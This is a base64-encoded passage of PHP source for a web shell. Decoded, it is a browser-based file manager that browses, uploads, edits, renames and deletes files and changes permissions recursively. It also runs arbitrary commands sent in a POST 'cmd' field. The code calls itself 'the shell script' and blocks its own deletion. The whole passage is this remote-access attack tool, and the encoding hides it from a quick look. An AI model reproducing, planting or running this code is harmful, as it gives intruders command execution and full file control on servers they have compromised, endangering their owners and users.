IH0gZWxzZWlmIChlbXB0eSgkZGlyZWN0b3J5QXJyYXkpKSB7CiAgICAgICAgICAkZGlyZWN0b3J5QXJyYXlbXSA9IFsncGF0aCcgPT4gJy8nLCAnbmFtZScgPT4gJy8nXTsKICAgICB9CgogICAgcmV0dXJuICRkaXJlY3RvcnlBcnJheTsKfQpmdW5jdGlvbiBzaG93QnJlYWRjcnVtYigkcGF0aCkKewogICAgJHBhdGhTZWdtZW50cyA9IGdldERpcmVjdG9yeUFycmF5KCRwYXRoKTsKICAgID8+CiAgICA8ZGl2IGNsYXNzPSJicmVhZGNydW1iIj4KICAgICAgICBESVIgOgogICAgICAgIDw/cGhwIGZvcmVhY2ggKCRwYXRoU2VnbWVudHMgYXMgJGluZGV4ID0+ICRzZWdtZW50KSB7ID8+CiAgICAgICAgICAgIDw/cGhwICRlbmNvZGVkUGF0aCA9IHVybGVuY29kZSgkc2VnbWVudFsncGF0aCddKTsgPz4KICAgICAgICAgICAgPD9waHAgJGRpc3BsYXlOYW1lID0gaHRtbHNwZWNpYWxjaGFycygkc2VnbWVudFsnbmFtZSddKTsgPz4KICAgICAgICAgICAgPD9waHAgaWYgKCRzZWdtZW50WyduYW1lJ10gPT09ICcvJykgJGRpc3BsYXlOYW1lID0gJy8nOyA/PgogICAgICAgICAgICA8YSBocmVmPSI/ZGlyPTw/cGhwIGVjaG8gJGVuY29kZWRQYXRoOyA/PiI+PD9waHAgZWNobyAkZGlzcGxheU5hbWU7ID8+PC9hPjw/cGhwIGlmICgkaW5kZXggPCBjb3VudCgkcGF0aFNlZ21lbnRzKSAtIDEgJiYgY291bnQoJHBhdGhTZWdtZW50cykgPiAxICYmICRzZWdtZW50WyduYW1lJ10gIT09ICcvJykgeyBlY2hvICcvJzsgfSA/PgogICAgICAgIDw/cGhwIH0gPz4KICAgIDwvZGl2PgogICAgPD9waHAKfQpmdW5jdGlvbiBzaG93RmlsZVRhYmxlKCRwYXRoKQp7CiAgICAkZmlsZURldGFpbHMgPSBAZ2V0RmlsZURldGFpbHMoJHBhdGgpOwogICAgPz4KICAgIDx0YWJsZT4KICAgICAgICA8dGhlYWQ+IDx0cj4KICAgICAgICAgICAgPHRoPk5hbWU8L3RoPgogICAgICAgICAgICA8dGg+VHlwZTwvdGg+CiAgICAgICAgICAgIDx0aD5TaXplPC90aD4KICAgICAgICAgICAgPHRoPlBlcm1pc3Npb248L3RoPgogICAgICAgICAgICA8dGg+QWN0aW9uczwvdGg+CiAgICAgICAgPC90cj4KICAgICAgICA8L3RoZWFkPgogICAgICAgIDx0Ym9keT4gPD9waHAgaWYgKGlzX2FycmF5KCRmaWxlRGV0YWlscykgJiYgIWVtcHR5KCRmaWxlRGV0YWlscykpIHsgPz4KICAgICAgICAgICAgPD9waHAgZm9yZWFjaCAoJGZpbGVEZXRhaWxzIGFzICRmaWxlRGV0YWlsKSB7ID8+CiAgICAgICAgICAgICAgICA8P3BocCAkaXRlbUZ1bGxQYXRoID0gcnRyaW0oJHBhdGgsICcvJykgLiAnLycgLiAkZmlsZURldGFpbFsnbmFtZSddOyA/PgogICAgICAgICAgICAgICAgPHRyPgogICAgICAgICAgICAgICAgICAgIDx0ZD4KICAgICAgICAgICAgICAgICAgICAgICAgPD9waHAgaWYgKCRmaWxlRGV0YWlsWyd0eXBlJ10gPT09ICdGb2xkZXInKSA6ID8+CiAgICAgICAgICAgICAgICAgICAgICAgIDxzdmcgc3R5bGU9IndpZHRoOiAxNnB4OyBoZWlnaHQ6IDE2cHg7IG1hcmdpbi1yaWdodDogNXB4OyB2ZXJ0aWNhbC1hbGlnbjogbWlkZGxlOyIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJjdXJyZW50Q29sb3IiPjxwYXRoIGQ9Ik0xMCA0SDRjLTEuMSAwLTEuOTkuOS0xLjk5IDJMMiAxOGMwIDEuMS45IDIgMiAyaDE2YzEuMSAwIDItLjkgMi0yVjhjMC0xLjEtLjktMi0yLTJoLThsLTItMnoiPjwvcGF0aD48L3N2Zz4KICAgICAgICAgICAgICAgICAgICAgICAgPD9waHAgZWxzZSA6ID8+CiAgICAgICAgICAgICAgICAgICAgICAgIDxzdmcgc3R5bGU9IndpZHRoOiAxNnB4OyBoZWlnaHQ6IDE2cHg7IG1hcmdpbi1yaWdodDogNXB4OyB2ZXJ0aWNhbC1hbGlnbjogbWlkZGxlOyIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJjdXJyZW50Q29sb3IiPjxwYXRoIGQ9Ik0xNCAySDZjLTEuMSAwLTEuOTkuOS0xLjk5IDJMNCAyMGMwIDEuMS44OSAyIDEuOTkgMkgxOGMxLjEgMCAyLS45IDItMlY4bC02LTZ6bTIgMTZIOHYtMmg4djJ6bTAtNEg4di0yaDh2MnptLTMtNVYzLjVMMTguNSA5SDEzeiI+PC9wYXRoPjwvc3ZnPgogICAgICAgICAgICAgICAgICAgICAgICA8P3BocCBlbmRpZjsgPz4KICAgICAgICAgICAgICAgICAgICAgICAgPD9waHAgZWNobyBnZXRMaW5rKCRpdGVtRnVsbFBhdGgsICRmaWxlRGV0YWlsWyduYW1lJ10pOyAvLyBUaGlzIG5vdyBsaW5rcyBmaWxlcyB0byB0aGUgcmVhZC9lZGl0IHZpZXcgPz4KICAgICAgICAgICAgICAgICAgICA8L3RkPgogICAgICAgICAgICAgICAgICAgIDx0ZD48P3BocCBlY2hvIGh0bWxzcGVjaWFsY2hhcnMoJGZpbGVEZXRhaWxbJ3R5cGUnXSk7ID8+PC90ZD4KICAgICAgICAgICAgICAgICAgICA8dGQ+PD9waHAgZWNobyBodG1sc3BlY2lhbGNoYXJzKCRmaWxlRGV0YWlsWydzaXplJ10pOyA/PjwvdGQ+CiAgICAgICAgICAgICAgICAgICAgPHRkPgogICAgICAgICAgICAgICAgICAgICAgICA8P3BocCAkaXNXcml0YWJsZSA9IEBpc193cml0YWJsZSgkaXRlbUZ1bGxQYXRoKTsgJHBlcm1pc3Npb25Db2xvciA9ICRpc1dyaXRhYmxlID8gJ2dyZWVuJyA6ICdyZWQnOyA/PgogICAgICAgICAgICAgICAgICAgICAgICA8c3BhbiBzdHlsZT0iY29sb3I6IDw/cGhwIGVjaG8gJHBlcm1pc3Npb25Db2xvcjsgPz4iPjw/cGhwIGVjaG8gaHRtbHNwZWNpYWxjaGFycygkZmlsZURldGFpbFsncGVybWlzc2lvbiddKTsgPz48L3NwYW4+IDw/cGhwIGVjaG8gJGlzV3JpdGFibGUgPyAnKFcpJyA6ICcnOyA/PgogICAgICAgICAgICAgICAgICAgIDwvdGQ+CiAgICAgICAgICAgICAgICAgICAgPHRkPgogICAgICAgICAgICAgICAgICAgICAgICA8P3BocCAkZW5jb2RlZFBhdGggPSB1cmxlbmNvZGUoJHBhdGgpOyA/PgogICAgICAgICAgICAgICAgICAgICAgICA8P3BocCAkZW5jb2RlZEl0ZW1QYXRoID0gdXJsZW5jb2RlKCRpdGVtRnVsbFBhdGgpOyA/PgogICAgICAgICAgICAgICAgICAgICAgICA8P3BocCAkZW5jb2RlZEl0ZW1OYW1lID0gdXJsZW5jb2RlKCRmaWxlRGV0YWlsWyduYW1lJ10pOyA/PgogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkcm9wZG93biI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c2VsZWN0IG9uY2hhbmdlPSJoYW5kbGVBY3Rpb25DaGFuZ2UodGhpcywgJzw/cGhwIGVjaG8gJGVuY29kZWRQYXRoOyA/PicsICc8P3BocCBlY2hvICRlbmNvZGVkSXRlbVBhdGg7ID8+JywgJzw/cGhwIGVjaG8gJGVuY29kZWRJdGVtTmFtZTsgPz4nKTsiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxvcHRpb24gdmFsdWU9IiIgc2VsZWN0ZWQgZGlzYWJsZWQ+QWN0aW9uPC9vcHRpb24+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiB2YWx1ZT0icmVuYW1lIj5SZW5hbWU8L29wdGlvbj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8b3B0aW9uIHZhbHVlPSJkZWxldGUiIHN0eWxlPSJjb2xvcjogcmVkOyI+RGVsZXRlPC9vcHRpb24+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L3NlbGVjdD4KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPC90ZD4KICAgICAgICAgICAgICAgIDwvdHI+CiAgICAgICAgICAgIDw/cGhwIH0gPz4KICAgICAgICA8P3BocCB9IGVsc2VpZiAoJGZpbGVEZXRhaWxzID09PSAnTm9uZScpIHsgPz4KICAgICAgICAgICAgIDx0cj4gPHRkIGNvbHNwYW49IjUiIHN0eWxlPSJjb2xvcjogcmVkOyI+RXJyb3I6IEZhaWxlZCB0byBzY2FuIGRpcmVjdG9yeS4gQ2hlY2sgcGVybWlzc2lvbnMuPC90ZD4gPC90cj4KICAgICAgICA8P3BocCB9IGVsc2UgeyA/PgogICAgICAgICAgICAgPHRyPiA8dGQgY29sc3Bhbj0iNSI+RGlyZWN0b3J5IGlzIGVtcHR5LjwvdGQ+IDwvdHI+CiAgICAgICAgPD9waHAgfSA/PgogICAgICAgIDwvdGJvZHk+CiAgICA8L3RhYmxlPgogICAgPHNjcmlwdD4KICAgICAgICBmdW5jdGlvbiBoYW5kbGVBY3Rpb25DaGFuZ2Uoc2VsZWN0RWxlbWVudCwgY3VycmVudERpckVuY29kZWQsIGl0ZW1QYXRoRW5jb2RlZCwgaXRlbU5hbWVFbmNvZGVkKSB7CiAgICAgICAgICAgIGNvbnN0IGFjdGlvbiA9IHNlbGVjdEVsZW1lbnQudmFsdWU7CiAgICAgICAgICAgIGlmICghYWN0aW9uKSByZXR1cm47CiAgICAgICAgICAgIGNvbnN0IGN1cnJlbnREaXIgPSBkZWNvZGVVUklDb21wb25lbnQoY3VycmVudERpckVuY29kZWQpOwogICAgICAgICAgICBjb25zdCBpdGVtUGF0aCA9IGRlY29kZVVSSUNvbXBvbmVudChpdGVtUGF0aEVuY29kZWQpOwogICAgICAgICAgICBjb25zdCBpdGVtTmFtZSA9IGRlY29kZVVSSUNvbXBvbmVudChpdGVtTmFtZUVuY29kZWQpOwogICAgICAgICAgICBzZWxlY3RFbGVtZW50LnNlbGVjdGVkSW5kZXggPSAwOwogICAgICAgICAgICBzd2l0Y2ggKGFjdGlvbikgewogICAgICAgICAgICAgICAgY2FzZSAncmVuYW1lJzoKICAgICAgICAgICAgICAgICAgICBjb25zdCBuZXdOYW1lID0gcHJvbXB0KCdFbnRlciBuZXcgbmFtZSBmb3IgIicgKyBpdGVtTmFtZSArICciOicsIGl0ZW1OYW1lKTsKICAgICAgICAgICAgICAgICAgICBpZiAobmV3TmFtZSAmJiBuZXdOYW1lICE9PSBpdGVtTmFtZSAmJiBuZXdOYW1lLnRyaW0oKSAhPT0gJycpIHsKICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgZm9ybURhdGEgPSBuZXcgRm9ybURhdGEoKTsKICAgICAgICAgICAgICAgICAgICAgICAgZm9ybURhdGEuYXBwZW5kKCduZXdfbmFtZScsIG5ld05hbWUudHJpbSgpKTsKICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgcG9zdFVybCA9ICc/ZGlyPScgKyBjdXJyZW50RGlyRW5jb2RlZCArICcmcmVuYW1lPScgKyBpdGVtUGF0aEVuY29kZWQ7CiAgICAgICAgICAgICAgICAgICAgICAgIGZldGNoKHBvc3RVcmwsIHsgbWV0aG9kOiAnUE9TVCcsIGJvZHk6IGZvcm1EYXRhIH0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAudGhlbihyZXNwb25zZSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHJlc3BvbnNlLnJlZGlyZWN0ZWQgfHwgcmVzcG9uc2Uub2spIHsgd2luZG93LmxvY2F0aW9uLnJlbG9hZCgpOyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7IHJldHVybiByZXNwb25zZS50ZXh0KCkudGhlbih0ZXh0ID0+IHsgdGhyb3cgbmV3IEVycm9yKCdSZW5hbWUgZmFpbGVkOiAnICsgdGV4dCk7IH0pOyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgLmNhdGNoKGVycm9yID0+IHsgY29uc29sZS5lcnJvcignUmVuYW1lIEVycm9yOicsIGVycm9yKTsgYWxlcnQoJ1JlbmFtZSBmYWlsZWQuIENoZWNrIGNvbnNvbGUgb3IgcGVybWlzc2lvbnMuJyk7IH0pOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgIGNhc2UgJ2RlbGV0ZSc6CiAgICAgICAgICAgICAgICAgICAgY29uc3QgZGVsZXRlVXJsID0gJz9kaXI9JyArIGN1cnJlbnREaXJFbmNvZGVkICsgJyZkZWxldGU9JyArIGl0ZW1QYXRoRW5jb2RlZDsKICAgICAgICAgICAgICAgICAgICBmZXRjaChkZWxldGVVcmwpCiAgICAgICAgICAgICAgICAgICAgICAgIC50aGVuKHJlc3BvbnNlID0+IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChyZXNwb25zZS5yZWRpcmVjdGVkIHx8IHJlc3BvbnNlLm9rKSB7IHdpbmRvdy5sb2NhdGlvbi5yZWxvYWQoKTsgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7IHJldHVybiByZXNwb25zZS50ZXh0KCkudGhlbih0ZXh0ID0+IHsgdGhyb3cgbmV3IEVycm9yKCdEZWxldGUgZmFpbGVkOiAnICsgdGV4dCk7IH0pOyB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICAgICAgICAgIC5jYXRjaChlcnJvciA9PiB7IGNvbnNvbGUuZXJyb3IoJ0RlbGV0ZSBFcnJvcjonLCBlcnJvcik7IGFsZXJ0KCdEZWxldGUgZmFpbGVkLiBDaGVjayBjb25zb2xlIG9yIHBlcm1pc3Npb25zLicpOyB9KTsKICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgIGRlZmF1bHQ6IGNvbnNvbGUud2FybignVW5oYW5kbGVkIGFjdGlvbjonLCBhY3Rpb24pOyBicmVhazsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIDwvc2NyaXB0PgogICAgPD9waHAKfQpmdW5jdGlvbiBjaGFuZ2VQZXJtaXNzaW9uKCRpdGVtUGF0aCwgJHBlcm1pc3Npb25JbnB1dCkKewogICAgaWYgKCFmaWxlX2V4aXN0cygkaXRlbVBhdGgpKSB7IHJldHVybiAnRXJyb3I6IEZpbGUgb3IgZGlyZWN0b3J5IGRvZXMgbm90IGV4aXN0Lic7IH0KICAgIGlmICghcHJlZ19tYXRjaCgnL15bMC03XXszLDR9JC8nLCAkcGVybWlzc2lvbklucHV0KSkgeyByZXR1cm4gJ0Vycm9yOiBJbnZhbGlkIHBlcm1pc3Npb24gZm9ybWF0LiBVc2UgMyBvciA0IG9jdGFsIGRpZ2l0cyAoZS5nLiwgMDc1NSwgNzU1KS4nOyB9CiAgICAkcGFyc2VkUGVybWlzc2lvbiA9IEBvY3RkZWMoJHBlcm1pc3Npb25JbnB1dCk7CiAgICBpZiAoJHBhcnNlZFBlcm1pc3Npb24gPT09IGZhbHNlKSB7IHJldHVybiAnRXJyb3I6IEludmFsaWQgcGVybWlzc2lvbiB2YWx1ZS4nOyB9CiAgICAkaXNSZWN1cnNpdmUgPSBpc19kaXIoJGl0ZW1QYXRoKTsKICAgIGlmICgkaXNSZWN1cnNpdmUpIHsKICAgICAgICAgaWYgKGNobW9kUmVjdXJzaXZlKCRpdGVtUGF0aCwgJHBhcnNlZFBlcm1pc3Npb24pKSB7IHJldHVybiAnUGVybWlzc2lvbiBjaGFuZ2VkIHJlY3Vyc2l2ZWx5IGZvciAnIC4gYmFzZW5hbWUoJGl0ZW1QYXRoKSAuICcgdG8gJyAuIHNwcmludGYoJyVvJywgJHBhcnNlZFBlcm1pc3Npb24pIC4gJy4nOyB9CiAgICAgICAgIGVsc2UgeyByZXR1cm4gJ0Vycm9yIGNoYW5naW5nIHBlcm1pc3Npb24gcmVjdXJzaXZlbHkgZm9yICcgLiBiYXNlbmFtZSgkaXRlbVBhdGgpIC4gJy4nOyB9CiAgICB9IGVsc2UgewogICAgICAgICBpZiAoQGNobW9kKCRpdGVtUGF0aCwgJHBhcnNlZFBlcm1pc3Npb24pKSB7IHJldHVybiAnUGVybWlzc2lvbiBjaGFuZ2VkIGZvciAnIC4gYmFzZW5hbWUoJGl0ZW1QYXRoKSAuICcgdG8gJyAuIHNwcmludGYoJyVvJywgJHBhcnNlZFBlcm1pc3Npb24pIC4gJy4nOyB9CiAgICAgICAgIGVsc2UgeyByZXR1cm4gJ0Vycm9yIGNoYW5naW5nIHBlcm1pc3Npb24gZm9yICcgLiBiYXNlbmFtZSgkaXRlbVBhdGgpIC4gJy4nOyB9CiAgICB9Cn0KZnVuY3Rpb24gY2htb2RSZWN1cnNpdmUoJHBhdGgsICRwZXJtaXNzaW9uKQp7CiAgICBpZiAoIUBjaG1vZCgkcGF0aCwgJHBlcm1pc3Npb24pKSB7IGVycm9yX2xvZygiY2htb2RSZWN1cnNpdmU6IEZhaWxlZCB0byBjaG1vZCBkaXIgJHBhdGgiKTsgcmV0dXJuIGZhbHNlOyB9CiAgICAkaXRlbXMgPSBAc2NhbmRpcigkcGF0aCk7CiAgICBpZiAoJGl0ZW1zID09PSBmYWxzZSkgeyBlcnJvcl9sb2coImNobW9kUmVjdXJzaXZlOiBGYWlsZWQgdG8gc2NhbmRpciAkcGF0aCIpOyByZXR1cm4gZmFsc2U7IH0KICAgIGZvcmVhY2ggKCRpdGVtcyBhcyAkaXRlbSkgewogICAgICAgIGlmICgkaXRlbSA9PSAnLicgfHwgJGl0ZW0gPT0gJy4uJykgeyBjb250aW51ZTsgfQogICAgICAgICRpdGVtUGF0aCA9ICRwYXRoIC4gJy8nIC4gJGl0ZW07CiAgICAgICAgaWYgKGlzX2RpcigkaXRlbVBhdGgpKSB7IGlmICghY2htb2RSZWN1cnNpdmUoJGl0ZW1QYXRoLCAkcGVybWlzc2lvbikpIHsgcmV0dXJuIGZhbHNlOyB9IH0KICAgICAgICBlbHNlIHsgaWYgKCFAY2htb2QoJGl0ZW1QYXRoLCAkcGVybWlzc2lvbikpIHsgZXJyb3JfbG9nKCJjaG1vZFJlY3Vyc2l2ZTogRmFpbGVkIHRvIGNobW9kIGZpbGUgJGl0ZW1QYXRoIik7IHJldHVybiBmYWxzZTsgfSB9CiAgICB9CiAgICByZXR1cm4gdHJ1ZTsKfQpmdW5jdGlvbiByZW5hbWVGaWxlKCRvbGRQYXRoLCAkbmV3TmFtZVJhdykKewogICAgaWYgKCFmaWxlX2V4aXN0cygkb2xkUGF0aCkpIHsgcmV0dXJuICdFcnJvcjogRmlsZSBvciBmb2xkZXIgZG9lcyBub3QgZXhpc3QuJzsgfQogICAgJG5ld05hbWUgPSBiYXNlbmFtZSgkbmV3TmFtZVJhdyk7CiAgICBpZiAoZW1wdHkoJG5ld05hbWUpIHx8ICRuZXdOYW1lID09PSAnLicgfHwgJG5ld05hbWUgPT09ICcuLicpIHsgcmV0dXJuICdFcnJvcjogSW52YWxpZCBuZXcgbmFtZS4nOyB9CiAgICAkZGlyZWN0b3J5ID0gZGlybmFtZSgkb2xkUGF0aCk7CiAgICAkbmV3UGF0aCA9ICRkaXJlY3RvcnkgLiAnLycgLiAkbmV3TmFtZTsKICAgIGlmIChyZWFscGF0aCgkb2xkUGF0aCkgPT09IHJlYWxwYXRoKCRuZXdQYXRoKSkgeyByZXR1cm4gJ0Vycm9yOiBOZXcgbmFtZSBpcyB0aGUgc2FtZSBhcyB0aGUgb2xkIG5hbWUuJzsgfQogICAgaWYgKHJlYWxwYXRoKCRuZXdQYXRoKSA9PT0gX19GSUxFX18pIHsgcmV0dXJuICdFcnJvcjogQ2Fubm90IHJlbmFtZSB0byB0aGUgc2hlbGwgc2NyaXB0IG5hbWUuJzsgfQogICAgaWYgKEByZW5hbWUoJG9sZFBhdGgsICRuZXdQYXRoKSkgeyByZXR1cm4gJ0ZpbGUgb3IgZm9sZGVyIHJlbmFtZWQgc3VjY2Vzc2Z1bGx5IHRvICcgLiBodG1sc3BlY2lhbGNoYXJzKCRuZXdOYW1lKSAuICcuJzsgfQogICAgZWxzZSB7ICRlcnJvciA9IGVycm9yX2dldF9sYXN0KCk7IHJldHVybiAnRXJyb3IgcmVuYW1pbmcgZmlsZSBvciBmb2xkZXIuICcgLiAoJGVycm9yID8gaHRtbHNwZWNpYWxjaGFycygkZXJyb3JbJ21lc3NhZ2UnXSkgOiAnQ2hlY2sgcGVybWlzc2lvbnMuJyk7IH0KfQpmdW5jdGlvbiBkZWxldGVGaWxlKCRmaWxlUGF0aCkKewogICAgaWYgKCFpc19maWxlKCRmaWxlUGF0aCkpIHsgcmV0dXJuICdFcnJvcjogRmlsZSBkb2VzIG5vdCBleGlzdCBvciBpcyBub3QgYSBmaWxlLic7IH0KICAgIGlmIChyZWFscGF0aCgkZmlsZVBhdGgpID09PSBfX0ZJTEVfXykgeyByZXR1cm4gJ0Vycm9yOiBDYW5ub3QgZGVsZXRlIHRoZSBzaGVsbCBzY3JpcHQgaXRzZWxmLic7IH0KICAgIGlmIChAdW5saW5rKCRmaWxlUGF0aCkpIHsgcmV0dXJuICdGaWxlICInIC4gaHRtbHNwZWNpYWxjaGFycyhiYXNlbmFtZSgkZmlsZVBhdGgpKSAuICciIGRlbGV0ZWQgc3VjY2Vzc2Z1bGx5Lic7IH0KICAgIGVsc2UgeyAkZXJyb3IgPSBlcnJvcl9nZXRfbGFzdCgpOyByZXR1cm4gJ0Vycm9yIGRlbGV0aW5nIGZpbGUuICcgLiAoJGVycm9yID8gaHRtbHNwZWNpYWxjaGFycygkZXJyb3JbJ21lc3NhZ2UnXSkgOiAnQ2hlY2sgcGVybWlzc2lvbnMuJyk7IH0KfQpmdW5jdGlvbiBkZWxldGVGb2xkZXIoJGZvbGRlclBhdGgpCnsKICAgIGlmICghaXNfZGlyKCRmb2xkZXJQYXRoKSkgeyByZXR1cm4gJ0Vycm9yOiBGb2xkZXIgZG9lcyBub3QgZXhpc3Qgb3IgaXMgbm90IGEgZGlyZWN0b3J5Lic7IH0KICAgIGlmIChyZWFscGF0aCgkZm9sZGVyUGF0aCkgPT09IHJlYWxwYXRoKGRpcm5hbWUoX19GSUxFX18pKSkgeyByZXR1cm4gJ0Vycm9yOiBDYW5ub3QgZGVsZXRlIHRoZSBkaXJlY3RvcnkgY29udGFpbmluZyB0aGUgc2hlbGwuJzsgfQogICAgJGNyaXRpY2FsRGlycyA9IFsnLycsICcvZXRjJywgJy9iaW4nLCAnL3NiaW4nLCAnL3VzcicsICcvdmFyJywgJy90bXAnXTsKICAgIGlmIChpbl9hcnJheShyZWFscGF0aCgkZm9sZGVyUGF0aCksICRjcml0aWNhbERpcnMpKSB7IHJldHVybiAnRXJyb3I6IERlbGV0aW5nIHRoaXMgY3JpdGljYWwgZGlyZWN0b3J5IGlzIGJsb2NrZWQuJzsgfQogICAgdHJ5IHsKICAgICAgICAkZmlsZXMgPSBuZXcgUmVjdXJzaXZlSXRlcmF0b3JJdGVyYXRvciggbmV3IFJlY3Vyc2l2ZURpcmVjdG9yeUl0ZXJhdG9yKCRmb2xkZXJQYXRoLCBSZWN1cnNpdmVEaXJlY3RvcnlJdGVyYXRvcjo6U0tJUF9ET1RTKSwgUmVjdXJzaXZlSXRlcmF0b3JJdGVyYXRvcjo6Q0hJTERfRklSU1QgKTsKICAgICAgICBmb3JlYWNoICgkZmlsZXMgYXMgJGZpbGVpbmZvKSB7CiAgICAgICAgICAgICRhY3Rpb24gPSAoJGZpbGVpbmZvLT5pc0RpcigpID8gJ3JtZGlyJyA6ICd1bmxpbmsnKTsKICAgICAgICAgICAgaWYgKCFAJGFjdGlvbigkZmlsZWluZm8tPmdldFJlYWxQYXRoKCkpKSB7ICRlcnJvciA9IGVycm9yX2dldF9sYXN0KCk7IHRocm93IG5ldyBFeGNlcHRpb24oJ0ZhaWxlZCB0byBkZWxldGUgJyAuICRmaWxlaW5mby0+Z2V0UmVhbFBhdGgoKSAuICcuICcgLiAoJGVycm9yID8gJGVycm9yWydtZXNzYWdlJ10gOiAnJykpOyB9CiAgICAgICAgfQogICAgICAgIGlmIChAcm1kaXIoJGZvbGRlclBhdGgpKSB7IHJldHVybiAnRm9sZGVyICInIC4gaHRtbHNwZWNpYWxjaGFycyhiYXNlbmFtZSgkZm9sZGVyUGF0aCkpIC4gJyIgZGVsZXRlZCBzdWNjZXNzZnVsbHkuJzsgfQogICAgICAgIGVsc2UgeyAkZXJyb3IgPSBlcnJvcl9nZXRfbGFzdCgpOyB0aHJvdyBuZXcgRXhjZXB0aW9uKCdGYWlsZWQgdG8gZGVsZXRlIHRoZSBtYWluIGZvbGRlciAnIC4gYmFzZW5hbWUoJGZvbGRlclBhdGgpIC4gJy4gJyAuICgkZXJyb3IgPyAkZXJyb3JbJ21lc3NhZ2UnXSA6ICcnKSk7IH0KICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiAkZSkgeyByZXR1cm4gJ0Vycm9yIGRlbGV0aW5nIGZvbGRlcjogJyAuIGh0bWxzcGVjaWFsY2hhcnMoJGUtPmdldE1lc3NhZ2UoKSk7IH0KfQoKLy8gLS0tIEdsb2JhbCBWYXJpYWJsZXMgJiBSZXF1ZXN0IEhhbmRsaW5nIC0tLQokY3VycmVudERpcmVjdG9yeSA9IGdldEN1cnJlbnREaXJlY3RvcnkoKTsKJGVycm9yTWVzc2FnZSA9ICcnOwokcmVzcG9uc2VNZXNzYWdlID0gJyc7CiRjbWRPdXRwdXQgPSAnJzsKJGNvbnRlbnQgPSAnJzsKCmlmIChpc3NldCgkX0dFVFsnZGlyJ10pKSB7CiAgICAkcmVxdWVzdGVkRGlyID0gdHJpbSgkX0dFVFsnZGlyJ10pOwogICAgY2hhbmdlRGlyZWN0b3J5KCRyZXF1ZXN0ZWREaXIpOwogICAgJGN1cnJlbnREaXJlY3RvcnkgPSBnZXRDdXJyZW50RGlyZWN0b3J5KCk7Cn0KCi8vIC0tLSBBY3Rpb24gSGFuZGxpbmcgKE9yZGVyIGNhbiBtYXR0ZXIpIC0tLQoKaWYgKGlzc2V0KCRfUE9TVFsndXBsb2FkJ10pICYmIGlzc2V0KCRfRklMRVNbJ2ZpbGUnXSkpIHsKICAgICRyZXNwb25zZU1lc3NhZ2UgPSB1cGxvYWRGaWxlKCRjdXJyZW50RGlyZWN0b3J5KTsKfQoKaWYgKGlzc2V0KCRfUE9TVFsnY21kJ10pKSB7CiAgICAkY21kT3V0cHV0ID0gZXhlY3V0ZUNvbW1hbmQoJF9QT1NUWydjbWQnXSk7CiAgICAkY21kT3V0cHV0ID0gIlsgRXhlY3V0aW5nOiAiIC4gaHRtbHNwZWNpYWxjaGFycygkX1BPU1RbJ2NtZCddKSAuICIgXVxuIiAuICRjbWRPdXRwdXQ7Cn0KCi8vIEhhbmRsZSBFZGl0IEFjdGlvbiAoU2F2ZSBPbmx5IC0gTG9hZGluZy9EaXNwbGF5IGlzIG5vdyBoYW5kbGVkIGJ5ICdyZWFkJykKaWYgKGlzc2V0KCRfR0VUWydlZGl0J10pICYmICRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddID09PSAnUE9TVCcgJiYgaXNzZXQoJF9QT1NUWydjb250ZW50J10pKSB7CiAgICAkZmlsZVRvRWRpdCA9ICRfR0VUWydlZGl0J107CiAgICBpZiAoc2F2ZUZpbGVDb250ZW50KCRmaWxlVG9FZGl0KSkgewogICAgICAgICRyZXNwb25zZU1lc3NhZ2UgPSAnRmlsZSAiJyAuIGh0bWxzcGVjaWFsY2hhcnMoYmFzZW5hbWUoJGZpbGVUb0VkaXQpKSAuICciIHNhdmVkIHN1Y2Nlc3NmdWxseS4nOwogICAgICAgIGhlYWRlcignTG9jYXRpb246ID9kaXI9JyAuIHVybGVuY29kZShkaXJuYW1lKCRmaWxlVG9FZGl0KSkgLiAnJnJlc3BvbnNlPScgLiB1cmxlbmNvZGUoJHJlc3BvbnNlTWVzc2FnZSkpOwogICAgICAgIGV4aXQ7CiAgICB9IGVsc2UgewogICAgICAgICRlcnJvck1lc3NhZ2UgPSAnRXJyb3Igc2F2aW5nIGZpbGUgIicgLiBodG1sc3BlY2lhbGNoYXJzKGJhc2VuYW1lKCRmaWxlVG9FZGl0KSkgLiAnIi4gQ2hlY2sgcGVybWlzc2lvbnMuJzsKICAgICAgICAgaGVhZGVyKCdMb2NhdGlvbjogP2Rpcj0nIC4gdXJsZW5jb2RlKGRpcm5hbWUoJGZpbGVUb0VkaXQpKSAuICcmcmVhZD0nIC4gdXJsZW5jb2RlKCRmaWxlVG9FZGl0KSAuICcmZXJyb3I9JyAuIHVybGVuY29kZSgkZXJyb3JNZXNzYWdlKSk7CiAgICAgICAgIGV4aXQ7CiAgICB9Cn0KCi8vIE5vdGU6IFRoaXMgc2VjdGlvbiBpcyBzdGlsbCBwcmVzZW50IGJ1dCB3b24ndCBiZSB0cmlnZ2VyZWQgYnkgdGhlIHNpbXBsaWZpZWQgVUkgZHJvcGRvd24KaWYgKGlzc2V0KCRfR0VUWydjaG1vZCddKSkgewogICAgICRpdGVtVG9DaG1vZCA9ICRfR0VUWydjaG1vZCddOwogICAgIGlmICgkX1NFUlZFU